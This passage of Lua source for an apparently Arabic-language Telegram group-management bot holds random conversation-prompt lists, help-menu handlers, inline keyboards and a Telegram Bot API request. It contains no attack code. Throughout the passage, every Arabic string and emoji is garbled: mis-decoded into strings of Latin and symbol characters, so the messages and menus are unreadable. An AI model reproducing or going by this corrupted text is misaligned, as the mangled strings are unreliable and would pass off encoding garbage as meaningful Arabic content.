" Ψ§ΨΉΨͺΩΩ Ψ¨Ψ³ΩΨΉΨͺΩ Ψ¬ΩΨ―Ψ§ ΩΨ³ΨͺΨ«Ψ¨Ψͺ ΩΩΩ Ψ§ΩΨ§ΩΨ§Ω Ψ§ΩΩΨ§ Ψ§ΨΊΩΩ ΩΨ§ ΨͺΩΩΩ",
"Ψ­ΩΩ ΨͺΩΩΩ ΩΨ§ΩΨ―ΨͺΩ Ψ³ΨͺΩΨ―Ω ΨΉ ΩΨΉΩ Ψ°Ψ§ΩΩ Ψ³ΨͺΩΨ―Ω ΨΉΩΩΩ ΨΊΨ§ΩΨ¨Ψ§.. ",
" ΩΨ§ ΨͺΨ?Ψ΄ Ψ§ΩΨΉΩΨ¨Ψ§Ψͺ Ψ§ΩΩΨ¨ΩΨ±Ω ΩΨ?ΩΩΩΨ§ ΨͺΩΨΉ Ψ§ΩΩΨ±Ψ΅ Ψ§ΩΨΉΨΈΩΩΩ",
"ΩΨ― ΩΨ§ ΩΨͺΨ·ΩΨ¨ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ«Ψ± ΩΩ Ψ΄Ψ?Ψ΅ ΩΨ§Ψ­Ψ― ΩΩΩΨ¨ Ψ­ΩΨ§ΨͺΩ Ψ±Ψ£Ψ³ ΨΉ ΨΉΩΨ¨ ",
"Ψ§Ψ?ΨͺΨ± Ψ±ΩΩΩΩ Ψ­ΩΨ§ΨͺΩ Ψ¨Ψ­Ψ±Ψ΅ ΩΩΩ ΩΨ±Ψ§Ψ± Ψ³ΩΨ΄ΩΩ 90ΩͺΩΩ Ψ³ΨΉΨ§Ψ―ΨͺΩ Ψ§Ω Ψ¨Ψ€Ψ³Ω ",
" Ψ§ΩΩΨ¨ Ψ§Ψ―Ψ§Ψ‘Ω Ψ§ΩΨ§Ψ΅Ψ―ΩΨ§Ψ‘ Ψ¨ΩΨΉΩ Ψ΄Ω Ψ¬ΩΩΩ ΩΩΩΨ¬Ψ§Ψ¦ ΩΩΩ",
"Ψ­ΩΩ ΨͺΨ―Ω Ψ§ΩΩΨ±Ψ΅Ω ΨΉ Ψ¨Ψ§Ψ¨Ψ§Ω Ψ§Ψ―ΨΉΩΩΨ§ ΩΩΨ¨ΩΨͺ ",
"ΨͺΨΉΩΩ Ψ§ΩΩΩΨ§ΨΉΨ― Ψ¬ΩΨ―Ψ§ Ψ«Ω Ψ§ΩΨ³Ψ± Ψ¨ΨΉΨ―ΩΨ§ ",
"Ψ§Ψ­ΩΩ ΨΉ ΩΨ¬Ψ§Ψ­Ω ΩΩ Ψ?ΩΨ§Ω ΩΨ―Ψ±ΨͺΩ ΨΉ Ψ§ΩΨΉΨ·Ψ§Ψ‘ ΩΩΩΨ³ Ψ§ΩΨ§Ψ?Ψ° ",
" ΩΨ§ ΨͺΨͺΨ¬Ψ§ΩΩ Ψ§ΩΨ΄ΩΨ·Ψ§Ω ΩΩΩΨ§ Ψ¨Ψ―Ω Ψ«ΩΨ§Ψ¨Ω",
"Ψ±ΩΨ² ΨΉ Ψ¬ΨΉΩ Ψ§ΩΨ§Ψ΄ΩΨ§Ψ‘ Ψ§ΩΨΆΩ ΩΩΩΨ³ Ψ§ΩΨ¨Ψ± Ψ§Ω Ψ§ΨΉΨΈΩ ",
"ΩΩ Ψ³ΨΉΩΨ―  Ψ¨ΩΨ§ ΨͺΩΨͺΩΩ ΩΨ§ΨΉΩΩ ΩΨ§ΩΨͺΩΨ§Ω ΩΨ§ ΨͺΨ±ΩΨ― ",
"Ψ§ΨΉΨ· Ψ§ΩΩΨ§Ψ³ Ψ§ΩΨ«Ψ± ΩΩ ΩΨ§ ΩΨͺΩΩΨΉΩΩ ",
" ΩΨ§ ΨͺΩΩ ΩΩΨ΄ΨΊΩ ΩΨ―Ψ±Ψ¬Ω ΨΉΨ―Ω Ψ§ΩΨͺΨΉΨ±Ω ΨΉ Ψ§Ψ΅Ψ―ΩΨ§Ψ‘ Ψ¬Ψ―Ψ―",
"Ψ§Ψ³ΨͺΨ­ΩΩ ΩΩΩ Ψ§ΩΨΉΩΨ― ΩΩΨΉΩΩπ€",
"ΩΨ΄ ΨͺΨ­Ψ¨ Ψ§Ω Ψ­Ψ― ΩΩΨ±Ψ¨ ΩΩΩ ",
" Ψ?ΩΩΩ ΩΨΉ Ψ§ΩΨ¨Ψͺ Ψ±Ψ§Ψ¬Ω Ψ?ΩΩΩ ΨͺΩΩΩπ₯₯",
" Ψ§ΩΨ΅Ψ­ ΩΩΨ³Ω Ψ¨ΩΩΨ³Ω Ψ¨ΩΨͺπ",
" ΩΩΨͺ ΩΨ΅Ψ­Ψͺ ΩΩΨ³Ω ΩΨ§Ψ?ΩΩΨ§πΉ", 
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "ΨͺΩΩΨͺ" or text == "ΩΨͺ ΨͺΩΩΨͺ" then 
local TWEET_Msg = { 
"Ψ§Ψ?Ψ± Ψ§ΩΩΨ§Ω Ψ΄Ψ§ΩΨ―ΨͺΩΨ§", 
"ΩΨ§ ΩΩ ΩΨΈΩΨͺΩ Ψ§ΩΨ­ΩΨ§Ω", 
"Ψ§ΨΉΨ² Ψ§Ψ΅Ψ―ΩΨ§Ψ¦Ω ?", 
"Ψ§Ψ?Ψ± Ψ§ΨΊΩΩΨ© Ψ³ΩΨΉΨͺΩΨ§ ?", 
"ΨͺΩΩΩ ΨΉΩ ΩΩΨ³Ω", 
"ΩΩΩ Ψ§ΩΨͺ ΩΨ΄ Ψ³Ψ§ΩΩ", 
"ΩΨ§ ΩΩΨ§ ΨΉΩΩΨ¨ Ψ³ΩΨ±Ψ³ Ψ§ΩΩΨ§Ψ ", 
"Ψ§Ψ?Ψ± ΩΨͺΨ§Ψ¨ ΩΨ±Ψ’ΨͺΩ", 
"Ψ±ΩΨ§ΩΨͺΩ Ψ§ΩΩΩΨΆΩΩ ?", 
"Ψ§Ψ?Ψ± Ψ§ΩΩΩ Ψ§ΩΩΨͺΩΨ§", 
"Ψ§Ψ?Ψ± ΩΨͺΨ§Ψ¨ ΩΨ±Ψ’ΨͺΩ", 
"ΩΩΩ Ψ¬Ψ§ΩΨ§ Ψ¬Ψ―ΨΉΨ ", 
"Ψ§ΩΨΆΩ ΩΩΩ Ω Ψ­ΩΨ§ΨͺΩ", 
"ΩΩΩ ΩΨΆΩΩΨͺΨ΄ ΩΩ Ψ¬ΩΨ§ΨͺΩ", 
"Ψ­ΩΩΨͺΩ Ω Ψ§ΩΨ­ΩΨ§Ω", 
"ΩΩΩ ΨΉΩΩΩΩ", 
"ΩΨͺΨ§Ψ¨Ω Ψ§ΩΩΩΨΆΩ", 
"ΩΩΨ§ΩΨͺΩ Ψ§ΩΩΩΨΆΩΩ", 
"ΨΉΩΨ§ΩΨͺΩ ΩΨΉ Ψ§ΩΩΩ", 
" ΩΨ§ Ψ§ΩΨ³ΩΨ‘ ΩΩ ΩΨ°Ω Ψ§ΩΨ­ΩΨ§Ψ© Ψ ", 
"Ψ£Ψ¬ΩΩ Ψ΄ΩΨ‘ Ψ­Ψ΅Ω ΩΨΉΩ Ψ?ΩΨ§Ω ΩΨ°Ψ§ Ψ§ΩΨ§Ψ³Ψ¨ΩΨΉ Ψ ", 
"Ψ³Ψ€Ψ§Ω ΩΩΨ±ΩΨ²Ω Ψ ", 
" ΩΩ ΩΨΉΨ¬Ψ¨Ω Ψ³ΩΨ±Ψ³ Ψ§ΩΩΨ§ ΨΨ ", 
" Ψ§ΩΨ«Ψ± ΩΩΨ«Ω ΨͺΨ­Ψ¨Ω Ψ ", 
"ΩΨ― ΨͺΨ?ΩΩΨͺ Ψ΄Ω ΩΩ Ψ¨Ψ§ΩΩ ΩΨ΅Ψ§Ψ± Ψ ", 
"Ψ΄ΩΨ‘ ΨΉΩΨ―Ω Ψ§ΩΩ ΩΩ Ψ§ΩΩΨ§Ψ³ Ψ ", 
"ΨͺΩΨΆΩΩ Ψ§ΩΩΩΨ§Ψ΄ Ψ§ΩΨ·ΩΩΩ Ψ§Ω ΨͺΨ­Ψ¨ Ψ§ΩΨ§Ψ?ΨͺΨ΅Ψ§Ψ± Ψ ", 
"ΩΨ΄ Ψ£Ψ?Ψ± Ψ΄Ω ΨΆΩΨΉΨͺΩΨ ", 
"Ψ§Ω Ψ±Ψ§ΩΩ ΩΩ Ψ³ΩΨ±Ψ³ Ψ§ΩΩΨ§ Ψ ", 
"ΩΩ ΩΨ±Ω Ψ­Ψ¨ΩΨͺΨ ", 
" Ψ§ΩΨ«Ψ± Ψ§ΩΩΨͺΨ§Ψ¨ΨΉΩΩ ΨΉΩΨ―Ω Ψ¨Ψ§Ω Ψ¨Ψ±ΩΨ§ΩΨ¬Ψ", 
" Ψ’Ψ?Ψ± ΩΨ±Ω ΨΆΨ±Ψ¨Ψͺ ΨΉΨ΄Ψ±Ω ΩΨ§ΩΨͺ ΩΨͺΩ Ψ", 
" ΩΨ³Ψ¨Ω Ψ§ΩΩΨ―Ω ΨΉΩΨ―Ω ΩΩΩ ΩΨ«ΩΨͺ ΩΩΩΩ Ψ", 
"ΨͺΨ­Ψ¨ ΨͺΨ±ΨͺΨ¨Ψ· Ψ¨ΩΩΨ±ΩΩ ΩΩΨ§ ΩΩΨ§ΨͺΨ", 
" Ψ¬Ψ±Ψ¨Ψͺ Ψ΄ΨΉΩΨ± Ψ§Ψ­Ψ― ΩΨ­Ψ¨Ω Ψ¨Ψ³ Ψ§ΩΨͺ ΩΩ ΩΨ§Ψ―Ψ± ΨͺΨ­Ψ¨ΩΨ", 
" ΨͺΨ¬Ψ§ΩΩ Ψ§ΩΩΨ§Ψ³ ΩΩΨ§ Ψ§ΩΩΩ Ψ¨ΩΩΨ¨Ω ΨΉΩΩ ΩΨ³Ψ§ΩΩΨ", 
" ΨΉΩΨ±Ω ΨΆΨ­ΩΨͺ Ψ¨Ψ§Ψ΄ΩΨ§Ψ‘ ΩΨ§Ψ¬Ω Ψ΄Ψ?Ψ΅ Ω ΩΨ³ΩΩ Ψ", 
"ΩΨΊΩΩ ΨͺΩΨ§Ψ­ΨΈ Ψ£Ω Ψ΅ΩΨͺΩ ΩΨΉΨ¬Ψ¨ Ψ§ΩΨ¬ΩΩΨΉ Ψ₯ΩΨ§ Ψ£ΩΨͺΨ ", 
" Ψ’Ψ?Ψ± ΨΊΩΨ·Ψ§Ψͺ ΨΉΩΨ±ΩΨ ", 
" ΩΨ³ΩΨ³Ω ΩΨ±ΨͺΩΩΩ ΩΩ Ψ°ΩΨ±ΩΨ§Ψͺ Ψ¬ΩΩΩΨ© ΨΉΩΨ―ΩΨ ", 
" ΩΨ§ Ψ£ΩΨ«Ψ± ΨͺΨ·Ψ¨ΩΩ ΨͺΩΨΆΩ ΩΩΨͺΩ ΨΉΩΩΩΨ ", 
" Ψ£ΩΩ Ψ΄ΩΨ‘ ΩΨ?Ψ·Ψ± ΩΩ Ψ¨Ψ§ΩΩ Ψ₯Ψ°Ψ§ Ψ³ΩΨΉΨͺ ΩΩΩΨ© ΩΨ¬ΩΩ Ψ ", 
" ΩΨ―ΩΨͺΩ ΩΩ Ψ§ΩΨ£Ψ¬ΩΨ§Ω Ψ§ΩΨ³Ψ§Ψ¨ΩΨ©Ψ ", 
" Ψ£ΩΨ«Ψ± Ψ·Ψ¨ΨΉ ΨͺΩΨͺΩ Ψ¨Ψ£Ω ΩΨͺΩΨ§Ψ¬Ψ― ΩΩ Ψ΄Ψ±ΩΩ/Ψ© Ψ­ΩΨ§ΨͺΩΨ ", 
"Ψ£ΩΨ«Ψ± Ψ­ΩΩΨ§Ω ΨͺΨ?Ψ§Ω ΩΩΩΨ ", 
" ΩΨ§ ΩΩ Ψ·Ψ±ΩΩΨͺΩ ΩΩ Ψ§ΩΨ­Ψ΅ΩΩ ΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ­Ψ© Ψ§ΩΩΩΨ³ΩΨ©Ψ ", 
" Ψ₯ΩΩΩΨ¬Ω ΩΨΉΨ¨ΩΨ± ΨΉΩ ΩΨ²Ψ§Ψ¬Ω Ψ§ΩΨ­Ψ§ΩΩΨ ", 
" Ψ£ΩΨ«Ψ± ΨͺΨΊΩΩΨ± ΨͺΨ±ΨΊΨ¨ Ψ£Ω ΨͺΨΊΩΩΨ±Ω ΩΩ ΩΩΨ³ΩΨ ", 
"Ψ£ΩΨ«Ψ± Ψ΄ΩΨ‘ Ψ£Ψ³ΨΉΨ―Ω Ψ§ΩΩΩΩΨ ", 
"Ψ§Ω Ψ±Ψ§ΩΩ ΩΩ Ψ§ΩΨ―ΩΩΨ§ Ψ―Ω Ψ ", 
"ΩΨ§ ΩΩ Ψ£ΩΨΆΩ Ψ­Ψ§ΩΨ² ΩΩΨ΄Ψ?Ψ΅Ψ ", 
"ΩΨ§ Ψ§ΩΨ°Ω ΩΨ΄ΨΊΩ Ψ¨Ψ§ΩΩ ΩΩ Ψ§ΩΩΨͺΨ±Ψ© Ψ§ΩΨ­Ψ§ΩΩΨ©Ψ", 
"Ψ’Ψ?Ψ± Ψ΄ΩΨ‘ ΩΨ―ΩΨͺ ΨΉΩΩΩΨ ", 
"Ψ΄Ψ§Ψ±ΩΩΨ§ Ψ΅ΩΨ±Ψ© Ψ§Ψ­ΨͺΨ±Ψ§ΩΩΨ© ΩΩ ΨͺΨ΅ΩΩΨ±ΩΨ ", 
"ΨͺΨͺΨ§Ψ¨ΨΉ Ψ§ΩΩΩΨ Ψ₯Ψ°Ψ§ ΩΨΉΩ ΩΨ§ Ψ£ΩΨΆΩ Ψ§ΩΩΩ Ψ΄Ψ§ΩΨ―ΨͺΩ ", 
"ΩΨ±Ψ― ΨΉΩΩΩ ΩΨͺΨ£Ψ?Ψ± ΨΉΩΩ Ψ±Ψ³Ψ§ΩΨ© ΩΩΩΨ© ΩΨ¨ΩΩ Ψ¨Ψ±ΩΨ―Ψ ΩΩΩΩΩΨ ", 
"ΩΨ΅ΩΨ­Ω ΨͺΨ¨Ψ―Ψ§ Ψ¨ -ΩΨ§- Ψ ", 
"ΩΨͺΨ§Ψ¨ Ψ£Ω Ψ±ΩΨ§ΩΨ© ΨͺΩΨ±Ψ£ΩΨ§ ΩΨ°Ω Ψ§ΩΨ£ΩΨ§ΩΨ ", 
"ΩΩΩΩ ΨΉΨ§ΩΩ ΩΩ Ψ°ΩΩΩ ΩΨ§ ΨͺΩΨ³Ψ§Ω ΩΩΩ Ψ±ΩΨΉΨͺΩΨ ", 
"ΩΩΩ ΩΨ§ ΩΩΩΩΩ ΩΨ³ΩΨ§ΩΩΨ ", 
"Ψ΄ΨΉΩΨ±Ω Ψ§ΩΨ­Ψ§ΩΩ ΩΩ Ψ¬ΩΩΨ©Ψ ", 
"ΩΩΩΨ© ΩΨ΄Ψ?Ψ΅ Ψ¨ΨΉΩΨ―Ψ ", 
"Ψ΅ΩΨ© ΩΨ·ΩΩΩΨ§ ΨΉΩΩΩ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΩΩΨΆΩΩΨ ", 
"Ψ£ΨΊΩΩΨ© ΨΉΨ§ΩΩΨ© ΩΩ Ψ°ΩΩΩ ΩΨ§ΩΩΩΩΩΩΨ ", 
"Ψ£ΩΩΨ© ΩΨ³ΨͺΨ­ΩΩ Ψ£Ω ΨͺΨ£ΩΩΩΨ§Ψ ", 
"ΩΩΩ ΩΨΆΩΨͺ ΩΩΨ§Ψ±ΩΨ ", 
"ΨͺΨ΅Ψ±ΩΩΩ ΩΨ§ΨͺΨͺΨ­ΩΩΩΨ ", 
"ΩΩΩΩ ΨΊΩΨ± Ψ­ΩΨ§ΨͺΩΨ ", 
"Ψ§ΩΨ«Ψ± ΩΨ΄Ψ±ΩΨ¨ ΨͺΨ­Ψ¨ΩΨ ", 
"Ψ§ΩΩΨ΅ΩΨ―Ψ© Ψ§ΩΩΩ ΨͺΨ£Ψ«Ψ± ΩΩΩΨ ", 
"ΩΨͺΩ ΩΨ΅Ψ¨Ψ­ Ψ§ΩΨ΅Ψ―ΩΩ ΨΊΨ±ΩΨ¨ ", 
"ΩΩΩ ΩΩΩΩ Ψ§ΩΨ³ΨΉΨ§Ψ―Ω Ψ¨Ψ±Ψ§ΩΩΨ ", 
"ΨͺΨ§Ψ±ΩΨ? ΩΩΩΨ§Ψ―ΩΨ ", 
"ΩΩΩΩ Ω ΩΨ§ Ψ΄Ψ§ΩΨ ", 
"ΩΩ ΩΨ­Ψ¨ΩΩΩ Ψ§ΩΩΩΩ Ψ£Ω Ψ§ΩΨ΅Ψ¨Ψ­Ψ ", 
"Ψ­ΩΩΨ§ΩΩ Ψ§ΩΩΩΨΆΩΨ ", 
"ΩΩΩΨ© ΨΊΨ±ΩΨ¨Ψ© ΩΩΨΉΩΨ§ΩΨ§Ψ ", 
"ΩΩ ΨͺΨ­ΨͺΨ§Ψ¬ ΩΩ ΩΩΨͺ ΩΨͺΨ«Ω Ψ¨Ψ΄Ψ?Ψ΅Ψ ", 
"Ψ§Ψ΄ΩΨ§Ψ‘ ΩΩΨ³Ω ΨͺΨ¬Ψ±Ψ¨ΩΨ§Ψ ", 
"ΩΩΩΩ ΨΆΨ§ΨΉ ΨΉΩΩΨ ", 
"ΩΩ Ψ΄ΩΨ‘ ΩΩΩΩ Ψ§ΩΨ§ Ψ ", 
"Ψ§Ψ³Ω ΩΨ§ΨͺΨ­Ψ¨Ω Ψ ", 
"ΩΩΩΨ© Ψ₯Ψ­ΨͺΨ±Ψ§Ω ΩΩΩ Ψ₯Ψ?ΨͺΨ±ΨΉ Ψ ", 
"Ψ£ΩΨ―Ω Ψ΄ΩΨ‘ ΩΨ­ΨͺΩΨΈ ΩΩΩ ΩΩ Ψ΅ΨΊΨ±ΩΨ ", 
"ΩΩΩΨ§Ψͺ ΩΨ§ΨͺΨ³ΨͺΨΊΩΩ ΨΉΩΩΨ§ Ψ¨Ψ³ΩΨ§ΩΩΩΨ ", 
"ΩΨ΄ Ψ§ΩΨ­Ψ¨ Ψ¨ΩΨΈΨ±ΩΨ ", 
"Ψ­Ψ¨ Ψ§ΩΨͺΩΩΩ ΩΩ Ψ΄Ψ?Ψ΅ΩΩΩΨͺΩ ΩΩΨ§ Ψ ", 
"ΨͺΨ?Ψ·Ψ· ΩΩΩΨ³ΨͺΩΨ¨Ω ΩΩΨ§ Ψ ", 
"ΩΩΩΩ ΩΨ­Ψ±Ψ¬ ΩΨ§ΨͺΩΨ³Ψ§Ω Ψ ", 
"ΩΩ Ψ·ΩΨ§Ψ³Ω ΩΩΨ¬ΨͺΩΩ Ψ ", 
"Ψ§ΨΉΨͺΨ±Ω Ψ¨Ψ§Ω Ψ­Ψ§Ψ¬Ω Ψ ", 
"ΨΉΨ¨ΩΨ± ΨΉΩ ΩΩΨ―Ω Ψ¨Ψ΅ΩΨ±Ω Ψ ",
"Ψ’Ψ?Ψ± ΩΨ±Ω ΨΆΨ±Ψ¨Ψͺ ΨΉΨ΄Ψ±Ω ΩΨ§ΩΨͺ ΩΨͺΩ Ψ", 
"Ψ§Ψ³Ω Ψ―Ψ§ΩΩ ΨΉ Ψ¨Ψ§ΩΩ Ψ ", 
"Ψ§Ψ΄ΩΨ§Ψ‘ ΨͺΩΨͺΨ?Ψ± Ψ§ΩΩ Ω Ψ³ΩΩΨͺΩΨ§ Ψ ", 
" ΩΩ Ψ¨ΩΩΩΩ ΩΨ§Ω Ψ ", 
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == 'Ψ§ΩΨ§ΩΨ§ΩΨ±' or text == 'Ψ§ΩΨ§ΩΨ±' or text == 'Ψ§ΩΨ£ΩΨ§ΩΨ±' then
if Addictive(msg) then
local Text =[[
ΩΨ±Ψ­Ψ¨Ψ§ Ψ¨Ω ΨΉΨ²ΩΨ²Ω ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ¬ΩΩΨΉΩπ¦
Ωβ’ββββββββββββββββββββ’Ω
β Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘           β Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ
β Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩ          β Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨΉΨ·ΩΩ
β Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ±           β Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΩ
β Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω.
Ωβ’ββββββββββββββββββββ’Ω
Ψ§Ψ?ΨͺΩΨ± Ψ§ΩΨ§ΩΩΨ± Ψ§ΩΨ°Ω ΨͺΨ±ΩΩΨ―Ω ΩΩΩ Ψ§ΩΨ£Ψ³ΩΩΩΩ.β¬οΈ

α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ', callback_data=msg.sender_user_id_.."/help1"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ', callback_data=msg.sender_user_id_.."/help2"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘', callback_data=msg.sender_user_id_.."/help3"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω', callback_data=msg.sender_user_id_.."/help4"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± ', callback_data=msg.sender_user_id_.."/help5"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨΉΨ·ΩΩ', callback_data=msg.sender_user_id_.."/homeaddrem"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΩ', callback_data=msg.sender_user_id_.."/homelocks"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end

if text == 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ' and Addictive(msg) then
Text = [[
π βΏ Ψ§ΩΨ§ΩΨ± Ψ­ΩΨ§ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βΊβΏΩΩΩ/ΩΨͺΨ­ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω 
βΊβΏΩΩΩ/ΩΨͺΨ­ + Ψ§ΩΨ§ΩΨ± Ψ¨Ψ§ΩΨͺΩΩΨ― β’ Ψ¨Ψ§ΩΨ·Ψ±Ψ― β’ Ψ¨Ψ§ΩΩΨͺΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβΏΨ§ΩΨ±ΩΨ§Ψ¨Ψ·
πβΏΨ§ΩΩΨΉΨ±Ω
πβΏΨ§ΩΨͺΨ§Ω
πβΏΨ§ΩΨ΄Ψ§Ψ±Ψ­Ω
πβΏΨ§ΩΨͺΨΉΨ―ΩΩ
πβΏΨ§ΩΨͺΨ«Ψ¨ΩΨͺ
πβΏΨ§ΩΩΨͺΨ­Ψ±ΩΩ
πβΏΨ§ΩΩΩΩΨ§Ψͺ
πβΏΨ§ΩΨ΅ΩΨ±
πβΏΨ§ΩΩΩΨ΅ΩΨ§Ψͺ
πβΏΨ§ΩΩΩΨ―ΩΩ
πβΏΨ§ΩΨ§ΩΩΨ§ΩΩ
πβΏΨ§ΩΨ―Ψ±Ψ―Ψ΄Ω
πβΏΨ§ΩΨͺΩΨ¬ΩΩ
πβΏΨ§ΩΨ§ΨΊΨ§ΩΩ
πβΏΨ§ΩΨ΅ΩΨͺ
πβΏΨ§ΩΨ¬ΩΨ§Ψͺ
πβΏΨ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ
πβΏΨ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ
πβΏΨ§ΩΨ¨ΩΨͺΨ§Ψͺ
πβΏΨ§ΩΨͺΩΨ±Ψ§Ψ±
πβΏΨ§ΩΩΩΨ§ΩΨ΄
πβΏΨ§ΩΨ³ΩΩΩΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κ Β» [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ' and Addictive(msg) then
Text = [[
π₯βΏΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βΆοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΩΨ²
π βΏΨͺΨ§Ω ΩΩΩΩ
π βΏΨΉΨ―Ψ― Ψ§ΩΨ¬Ψ±ΩΨ¨
π«βΏΩΨͺΩ
π·βΏΨ­ΨΈΨ±
π·βΏΨ·Ψ±Ψ―
π«βΏΩΩΨΉ
π«βΏΨͺΩΩΨ―
βΊβΏΨ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±
βΊβΏΨ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ
βΊβΏΨ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ―
βΊβΏΨ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ
πβΏΨ§ΩΩΨ­ΨΈΩΨ±ΩΩ
πβΏΨ§ΩΩΩΨͺΩΩΩΩ
πβΏΨ§ΩΩΩΩΨ²ΩΩ
πβΏΨ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
πβΏΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ
πβΏΨͺΨ«Ψ¨ΩΨͺ
βΊβΏΨ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ
πβΏΨ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ
π³βΏΨ§ΩΨ±Ψ§Ψ¨Ψ·
πβΏΨ§ΩΩΩΨ§ΩΩΩ
ππ»βΏΨ§ΩΨͺΨ±Ψ­ΩΨ¨
ππ»βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨
β οΈβΏΨ§ΨΆΩ /ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ 
β οΈβΏΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± + Ψ§ΩΨΉΨ―Ψ―
π­βΏΨ§ΩΨ―Ω
π­βΏΨ¬ΩΨ§ΨͺΩ
π­βΏΨ³Ψ­ΩΨ§ΨͺΩ
π­βΏΨ±Ψ³Ψ§Ψ¦ΩΩ
π­βΏΩΨ΄Ω Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβΏΩΨΆΨΉ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
π¨βΏΨ§Ψ³Ω
π¨βΏΨ±Ψ§Ψ¨Ψ·
π¨βΏΨ΅ΩΨ±Ω
π¨βΏΩΨ΅Ω
π¨βΏΩΩΨ§ΩΩΩ
π¨βΏΨͺΨ±Ψ­ΩΨ¨
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβΏΩΨ³Ψ­ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
π βΏΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ
π βΏΨ§ΩΩΨ­ΨΈΩΨ±ΩΩ
π βΏΨ§ΩΩΩΩΨ²ΩΩ
π βΏΨ§ΩΩΩΨͺΩΩΩΩ
π βΏΨ§ΩΩΨ·Ψ±ΩΨ―ΩΩ
π βΏΨ§ΩΩΩΨ§ΩΩΩ
π βΏΨ§ΩΨ¨ΩΨͺΨ§Ψͺ
π βΏΨ§ΩΨ΅ΩΨ±Ω
π βΏΨ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
π βΏΨ§ΩΨ±Ψ§Ψ¨Ψ·
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘' and Owner(msg) then
Text = [[
π₯βΏ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
